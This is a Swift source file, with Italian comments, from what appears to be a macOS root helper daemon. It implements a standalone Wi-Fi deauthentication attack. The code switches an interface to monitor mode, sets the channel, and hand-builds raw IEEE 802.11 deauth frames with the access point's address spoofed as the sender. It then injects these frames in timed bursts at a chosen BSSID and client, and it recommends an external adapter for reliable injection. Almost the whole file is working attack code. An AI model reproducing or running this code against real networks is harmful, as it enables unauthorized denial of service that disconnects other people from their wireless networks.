//
//  DeauthAttackOperation.swift
//  HelperDaemon
//
//  Operazione di attacco deauthentication 802.11 standalone.
//  Invia frame deauth IEEE 802.11 via pcap injection in monitor mode.
//  Richiede privilegi root (eseguita dal LaunchDaemon).
//
//  NOTA: I chipset WiFi Apple generalmente non supportano injection via pcap_sendpacket.
//  I frame potrebbero essere silenziosamente scartati dal driver.
//  Per injection affidabile usare un adattatore WiFi USB esterno (es. Alfa AWUS036ACH).
//

import Foundation
import os

// MARK: - Result

struct DeauthAttackResultData: Codable {
    let framesSent: Int
    let framesFailed: Int
    let durationSeconds: Double
    let targetBSSID: String
    let clientMAC: String
}

// MARK: - Operation

class DeauthAttackOperation: BaseOperation {

    private var pcapHandle: OpaquePointer?

    override func cancel() {
        super.cancel()
        if let handle = pcapHandle {
            pcap_bridge_breakloop(handle)
        }
    }

    // MARK: - Execute

    func execute(interfaceName: String, targetBSSID: String,
                 clientMAC: String, channel: Int32,
                 burstCount: Int32, intervalMs: Int32,
                 reasonCode: Int32, durationSeconds: Int32) -> Result<Data, Error> {

        HelperLogger.operations.info("[DeauthAttack] === INIZIO ===")
        HelperLogger.operations.info("[DeauthAttack] Target BSSID: \(targetBSSID), Client: \(clientMAC), CH: \(channel)")
        HelperLogger.operations.info("[DeauthAttack] Burst: \(burstCount), Interval: \(intervalMs)ms, Reason: \(reasonCode), Durata: \(durationSeconds)s")

        // Step 1: Disassocia WiFi
        let disassocResult = interfaceName.withCString { iface in
            pcap_bridge_disassociate_wifi(iface)
        }
        HelperLogger.operations.info("[DeauthAttack] Dissociazione WiFi: \(disassocResult == 0 ? "OK" : "fallita (\(disassocResult))")")
        Thread.sleep(forTimeInterval: 0.5)

        // Step 2: Apri pcap in monitor mode
        var errbuf = [CChar](repeating: 0, count: Int(PCAP_ERRBUF_SIZE))
        var activateStatus: Int32 = 0

        let handle = interfaceName.withCString { iface in
            pcap_bridge_open_monitor_ex(iface, 65535, 1000, &errbuf, &activateStatus)
        }

        guard let pcap = handle else {
            let errMsg = String(cString: errbuf)
            HelperLogger.forwardError(category: "Operations", message: "FALLITO: pcap_bridge_open_monitor_ex → NULL: \(errMsg)", tag: "[DeauthAttack]")
            interfaceName.withCString { iface in
                _ = pcap_bridge_restore_wifi(iface)
            }
            return .failure(HelperError.pcapError("Monitor mode open fallito: \(errMsg)"))
        }
        self.pcapHandle = pcap

        // Verifica monitor mode attivo
        let isMonitor = pcap_bridge_is_monitor_mode(pcap)
        guard isMonitor == 1 else {
            let dlt = pcap_bridge_datalink(pcap)
            HelperLogger.forwardError(category: "Operations", message: "FALLITO: non in monitor mode (DLT=\(dlt))", tag: "[DeauthAttack]")
            pcap_bridge_close(pcap)
            self.pcapHandle = nil
            interfaceName.withCString { iface in
                _ = pcap_bridge_restore_wifi(iface)
            }
            return .failure(HelperError.pcapError("Interfaccia non in monitor mode"))
        }

        defer {
            HelperLogger.operations.info("[DeauthAttack] Chiusura pcap e ripristino WiFi...")
            pcap_bridge_close(pcap)
            self.pcapHandle = nil
            interfaceName.withCString { iface in
                _ = pcap_bridge_restore_wifi(iface)
            }
            HelperLogger.operations.info("[DeauthAttack] WiFi ripristinato")
        }

        // Step 3: Imposta canale
        if channel > 0 {
            let chResult = interfaceName.withCString { iface in
                pcap_bridge_set_channel(iface, channel)
            }
            HelperLogger.operations.info("[DeauthAttack] Set canale \(channel) → \(chResult == 0 ? "OK" : "fallito")")
        }

        // Step 4: Loop di invio deauth frame
        let startTime = Date()
        let deadline = startTime.addingTimeInterval(Double(durationSeconds))
        let targetBSSIDUpper = targetBSSID.uppercased()
        let clientMACUpper = clientMAC.uppercased()

        var framesSent = 0
        var framesFailed = 0

        while Date() < deadline && !isCancelled {
            // Invia burst di frame deauth
            for _ in 0..<burstCount {
                guard !isCancelled else { break }

                let ok = sendDeauthFrame(pcap: pcap,
                                          bssid: targetBSSIDUpper,
                                          clientMac: clientMACUpper,
                                          reasonCode: reasonCode)
                if ok {
                    framesSent += 1
                } else {
                    framesFailed += 1
                }
            }

            // Attendi intervallo tra burst
            if !isCancelled && Date() < deadline {
                usleep(UInt32(intervalMs) * 1000)
            }

            // Log periodico ogni 2 secondi
            let elapsed = Date().timeIntervalSince(startTime)
            if Int(elapsed) % 2 == 0 && framesSent > 0 {
                HelperLogger.operations.info("[DeauthAttack] [LIVE] sent=\(framesSent), failed=\(framesFailed), elapsed=\(String(format: "%.0f", elapsed))s")
            }
        }

        let duration = Date().timeIntervalSince(startTime)
        HelperLogger.operations.info("[DeauthAttack] === COMPLETATO === sent=\(framesSent), failed=\(framesFailed), durata=\(String(format: "%.1f", duration))s")

        let result = DeauthAttackResultData(
            framesSent: framesSent,
            framesFailed: framesFailed,
            durationSeconds: duration,
            targetBSSID: targetBSSID,
            clientMAC: clientMAC
        )

        do {
            let jsonData = try JSONEncoder().encode(result)
            return .success(jsonData)
        } catch {
            return .failure(HelperError.operationFailed("Serializzazione DeauthAttack fallita: \(error)"))
        }
    }

    // MARK: - Deauth Frame Construction

    /// Costruisce e invia un frame deauth IEEE 802.11 via pcap injection.
    /// RadioTap header (8 bytes) + IEEE 802.11 Deauth frame (26 bytes).
    /// NOTA: chipset WiFi Apple potrebbero scartare silenziosamente il frame.
    @discardableResult
    private func sendDeauthFrame(pcap: OpaquePointer, bssid: String,
                                  clientMac: String, reasonCode: Int32) -> Bool {
        // RadioTap header minimo (8 bytes): version=0, pad=0, length=8 LE, present=0
        let radioTapHeader: [UInt8] = [
            0x00,                   // version
            0x00,                   // pad
            0x08, 0x00,             // length (8 bytes, LE)
            0x00, 0x00, 0x00, 0x00  // present flags (none)
        ]

        // Converti MAC string → bytes
        let bssidBytes = macToBytes(bssid)
        let clientBytes = macToBytes(clientMac)

        guard bssidBytes.count == 6, clientBytes.count == 6 else {
            HelperLogger.forwardError(category: "Operations", message: "MAC non valido: bssid=\(bssid), client=\(clientMac)", tag: "[DeauthAttack]")
            return false
        }

        // IEEE 802.11 Deauthentication frame (26 bytes)
        // FC: 0xC0,0x00 (Deauth, subtype 12, type 0 management)
        // Duration: 0x013A
        // Addr1 = DA (client), Addr2 = SA (AP/BSSID), Addr3 = BSSID
        // Seq Ctrl: 0x0000
        // Reason code: 2 bytes LE
        var deauthFrame: [UInt8] = [
            0xC0, 0x00,                 // Frame Control (Deauthentication)
            0x3A, 0x01,                 // Duration
        ]
        deauthFrame += clientBytes      // Addr1: Destination (client)
        deauthFrame += bssidBytes       // Addr2: Source (spoofed as AP)
        deauthFrame += bssidBytes       // Addr3: BSSID
        deauthFrame += [0x00, 0x00]     // Sequence Control
        deauthFrame += [UInt8(reasonCode & 0xFF), UInt8((reasonCode >> 8) & 0xFF)] // Reason code LE

        let packet = radioTapHeader + deauthFrame
        let result = packet.withUnsafeBufferPointer { buf in
            pcap_bridge_send_packet(pcap, buf.baseAddress, Int32(buf.count))
        }

        return result == 0
    }

    /// Converte una stringa MAC "AA:BB:CC:DD:EE:FF" in array di 6 bytes
    private func macToBytes(_ mac: String) -> [UInt8] {
        let components = mac.split(separator: ":").compactMap { UInt8($0, radix: 16) }
        return components
    }
}
